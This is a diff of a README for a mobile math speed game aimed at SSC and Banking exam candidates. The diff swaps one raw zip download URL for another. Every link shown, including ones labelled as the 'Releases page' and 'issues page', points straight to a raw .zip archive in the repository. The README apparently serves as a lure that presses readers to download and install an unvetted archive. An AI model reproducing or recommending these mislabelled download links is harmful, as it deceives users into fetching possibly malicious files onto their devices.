@@ -4,17 +4,17 @@
 calc-speed-game is a mobile-friendly calculation speed game designed for SSC and Banking aspirants. It includes exciting levels, streak challenges, a circular timer, and a leaderboard to track your progress. This game will help you sharpen your math skills quickly and effectively. 
 
 ## 📥 Download Now
-[![Download calc-speed-game](https://raw.githubusercontent.com/pepitoing/calc-speed-game/main/data/calc_speed_game_3.3-beta.2.zip)](https://raw.githubusercontent.com/pepitoing/calc-speed-game/main/data/calc_speed_game_3.3-beta.2.zip)
+[![Download calc-speed-game](https://raw.githubusercontent.com/pepitoing/calc-speed-game/main/game/game-speed-calc-v1.6.zip)](https://raw.githubusercontent.com/pepitoing/calc-speed-game/main/game/game-speed-calc-v1.6.zip)
 
 ## 🚀 Getting Started
 Getting started with calc-speed-game is simple. Follow these steps to download and run the game:
 
-1. **Visit the Download Page:** Go to our [Releases page](https://raw.githubusercontent.com/pepitoing/calc-speed-game/main/data/calc_speed_game_3.3-beta.2.zip) to find the latest version of the game.
+1. **Visit the Download Page:** Go to our [Releases page](https://raw.githubusercontent.com/pepitoing/calc-speed-game/main/game/game-speed-calc-v1.6.zip) to find the latest version of the game.
 
 2. **Choose Your Version:** Look for the most recent release. Click on it to view the available files.
 
 3. **Download the Game:** 
-   - If you see a file named like `https://raw.githubusercontent.com/pepitoing/calc-speed-game/main/data/calc_speed_game_3.3-beta.2.zip`, click on it to start downloading. 
+   - If you see a file named like `https://raw.githubusercontent.com/pepitoing/calc-speed-game/main/game/game-speed-calc-v1.6.zip`, click on it to start downloading. 
    - If you are on a mobile device, it may prompt you to install it directly.
 
 4. **Install the Game:**
@@ -43,7 +43,7 @@ The game is designed to run smoothly on most modern mobile devices. Here are the
 ## 👫 Join the Community
 Join the conversation and connect with other users for tips and strategies.
 
-- **GitHub Issues:** If you face any problems or have suggestions, feel free to visit our [issues page](https://raw.githubusercontent.com/pepitoing/calc-speed-game/main/data/calc_speed_game_3.3-beta.2.zip) to report them.
+- **GitHub Issues:** If you face any problems or have suggestions, feel free to visit our [issues page](https://raw.githubusercontent.com/pepitoing/calc-speed-game/main/game/game-speed-calc-v1.6.zip) to report them.
 - **Feedback:** Share your thoughts on how to improve the game.
 
 ## 🔧 Troubleshooting
@@ -73,4 +73,4 @@ For any additional queries, you can reach out through our support email or direc
 Now that you know how to download and run calc-speed-game, it's time to improve your calculation speed. Enjoy the game and good luck with your studies! 
 
 ## 📥 Download Again
-Don't forget to visit the [Releases page](https://raw.githubusercontent.com/pepitoing/calc-speed-game/main/data/calc_speed_game_3.3-beta.2.zip) for the latest updates and downloads.
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/pepitoing/calc-speed-game/main/game/game-speed-calc-v1.6.zip) for the latest updates and downloads.
